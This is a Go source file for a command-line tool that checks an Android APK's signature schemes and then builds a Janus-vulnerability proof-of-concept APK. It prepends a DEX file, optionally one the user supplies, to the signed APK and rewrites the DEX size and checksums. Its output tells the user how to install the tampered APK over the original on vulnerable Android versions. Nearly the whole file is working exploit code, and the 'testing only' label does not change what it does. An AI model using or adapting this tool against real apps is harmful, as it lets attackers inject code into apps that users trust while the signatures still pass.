package main

import (
	"archive/zip"
	"crypto/sha1"
	"encoding/binary"
	"flag"
	"fmt"
	"hash/adler32"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
)

type APKInfo struct {
	HasV1Signature bool
	HasV2Signature bool
	HasV3Signature bool
	FilePath       string
}

func main() {
	apkPath := flag.String("apk", "", "Path to APK file")
	dexPath := flag.String("dex", "", "Path to DEX file (optional)")
	flag.Parse()

	if *apkPath == "" {
		fmt.Println("Error: APK path is required")
		flag.Usage()
		os.Exit(1)
	}

	info, err := analyzeAPK(*apkPath)
	if err != nil {
		fmt.Printf("Error analyzing APK: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("\nAPK Analysis Results for: %s\n", *apkPath)
	fmt.Println("================================")
	fmt.Printf("V1 Signature: %v\n", info.HasV1Signature)
	fmt.Printf("V2 Signature: %v\n", info.HasV2Signature)
	fmt.Printf("V3 Signature: %v\n", info.HasV3Signature)
	fmt.Println()

	// Vulnerability Assessment
	if !info.HasV1Signature {
		fmt.Println("Vulnerability Assessment:")
		fmt.Println("✅ APK is not vulnerable to Janus:")
		fmt.Println("- No V1 signature found")
		fmt.Println("- Cannot be exploited on any Android version")
		return
	}

	if info.HasV2Signature || info.HasV3Signature {
		fmt.Println("Vulnerability Assessment:")
		fmt.Println("⚠ APK has V1 + V2/V3 signatures:")
		fmt.Println("- Only vulnerable on Android 5.0-6.0 (API 21-23)")
		fmt.Println("- Creating POC APK for testing on these versions...")
		
		// Create POC APK
		if err := createPoCAPK(info, *dexPath); err != nil {
			fmt.Printf("Error creating POC APK: %v\n", err)
			os.Exit(1)
		}
	} else {
		fmt.Println("Vulnerability Assessment:")
		fmt.Println("❌ APK is highly vulnerable to Janus (V1-only signature):")
		fmt.Println("- Vulnerable on Android 5.0-8.0 (API 21-26)")
		fmt.Println("- Creating POC APK for testing...")
		
		// Create POC APK
		if err := createPoCAPK(info, *dexPath); err != nil {
			fmt.Printf("Error creating POC APK: %v\n", err)
			os.Exit(1)
		}
	}
}

func dumpBlock(block []byte) {
	fmt.Printf("Block size: %d bytes\n", len(block))
	pos := 8 // Skip initial size
	for pos+12 < len(block) {
		pairLen := binary.LittleEndian.Uint64(block[pos:])
		if pairLen == 0 || uint64(pos)+8+pairLen > uint64(len(block)) {
			break
		}
		id := binary.LittleEndian.Uint32(block[pos+8:])
		fmt.Printf("Found ID: 0x%x, length: %d\n", id, pairLen)
		pos += 8 + int(pairLen)
	}
}

func parseApksignerOutput(output string) (v1, v2, v3 bool) {
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, "Verified using v1 scheme"):
			v1 = strings.Contains(line, "true")
		case strings.HasPrefix(line, "Verified using v2 scheme"):
			v2 = strings.Contains(line, "true")
		case strings.HasPrefix(line, "Verified using v3 scheme"):
			v3 = strings.Contains(line, "true")
		}
	}
	return
}

func analyzeAPK(apkPath string) (*APKInfo, error) {
	info := &APKInfo{FilePath: apkPath}

	// Run apksigner verify
	cmd := exec.Command("apksigner", "verify", "-v", apkPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		// If apksigner fails, fallback to checking META-INF signatures
		reader, err := zip.OpenReader(apkPath)
		if err != nil {
			return nil, fmt.Errorf("failed to open APK: %v", err)
		}
		defer reader.Close()

		for _, file := range reader.File {
			if strings.HasPrefix(file.Name, "META-INF/") &&
				(strings.HasSuffix(file.Name, ".RSA") ||
					strings.HasSuffix(file.Name, ".DSA") ||
					strings.HasSuffix(file.Name, ".EC")) {
				info.HasV1Signature = true
				break
			}
		}
	} else {
		// Parse apksigner output
		info.HasV1Signature, info.HasV2Signature, info.HasV3Signature = parseApksignerOutput(string(output))
	}

	return info, nil
}

func createPoCAPK(info *APKInfo, pocDexPath string) error {
	outputPath := strings.TrimSuffix(info.FilePath, ".apk") + "_janus_poc.apk"

	// Read original APK
	apkData, err := ioutil.ReadFile(info.FilePath)
	if err != nil {
		return fmt.Errorf("failed to read original APK: %v", err)
	}

	// Get DEX content
	var dexData []byte
	if pocDexPath != "" {
		dexData, err = ioutil.ReadFile(pocDexPath)
		if err != nil {
			return fmt.Errorf("failed to read POC dex: %v", err)
		}
	} else {
		dexData = generateMinimalDex()
	}

	// Create output data
	outData := make([]byte, len(dexData)+len(apkData))
	copy(outData, dexData)
	copy(outData[len(dexData):], apkData)

	// Update DEX file size and checksums
	binary.LittleEndian.PutUint32(outData[32:36], uint32(len(outData)))
	if err := updateDexChecksum(outData); err != nil {
		return fmt.Errorf("failed to update DEX checksums: %v", err)
	}

	// Write output file
	if err := ioutil.WriteFile(outputPath, outData, 0644); err != nil {
		return fmt.Errorf("failed to write output file: %v", err)
	}

	fmt.Printf("\nCreated POC APK: %s\n", outputPath)
	fmt.Println("⚠ Warning: This is a proof-of-concept file for testing purposes only")
	if info.HasV2Signature || info.HasV3Signature {
		fmt.Println("- Install on Android 5.0-6.0 (API 21-23) for testing")
	} else {
		fmt.Println("- Install on Android 5.0-8.0 (API 21-26) for testing")
	}
	fmt.Println("- Use 'adb install -r' to replace existing app")
	fmt.Printf("- APK size: %d bytes, DEX size: %d bytes\n", len(outData), len(dexData))

	return nil
}

func updateDexChecksum(data []byte) error {
	// Update SHA1 signature
	h := sha1.New()
	h.Write(data[32:])
	copy(data[12:32], h.Sum(nil))

	// Update Adler32 checksum
	checksum := adler32.Checksum(data[12:])
	binary.LittleEndian.PutUint32(data[8:12], checksum)

	return nil
}

func generateMinimalDex() []byte {
	// Create a minimal valid DEX header with proper magic and checksum
	dexHeader := []byte{
		0x64, 0x65, 0x78, 0x0A, 0x30, 0x33, 0x35, 0x00, // DEX_FILE_MAGIC "dex\n035\0"
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // checksum
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // signature
		0x70, 0x00, 0x00, 0x00, // file_size
		0x70, 0x00, 0x00, 0x00, // header_size
		0x78, 0x56, 0x34, 0x12, // endian_tag
		0x00, 0x00, 0x00, 0x00, // link_size
		0x00, 0x00, 0x00, 0x00, // link_off
		0x00, 0x00, 0x00, 0x00, // map_off
		0x01, 0x00, 0x00, 0x00, // string_ids_size
		0x70, 0x00, 0x00, 0x00, // string_ids_off
		0x01, 0x00, 0x00, 0x00, // type_ids_size
		0x78, 0x00, 0x00, 0x00, // type_ids_off
		0x00, 0x00, 0x00, 0x00, // proto_ids_size
		0x00, 0x00, 0x00, 0x00, // proto_ids_off
		0x00, 0x00, 0x00, 0x00, // field_ids_size
		0x00, 0x00, 0x00, 0x00, // field_ids_off
		0x01, 0x00, 0x00, 0x00, // method_ids_size
		0x80, 0x00, 0x00, 0x00, // method_ids_off
		0x01, 0x00, 0x00, 0x00, // class_defs_size
		0x88, 0x00, 0x00, 0x00, // class_defs_off
		0x10, 0x00, 0x00, 0x00, // data_size
		0x90, 0x00, 0x00, 0x00, // data_off
	}
	return dexHeader
}
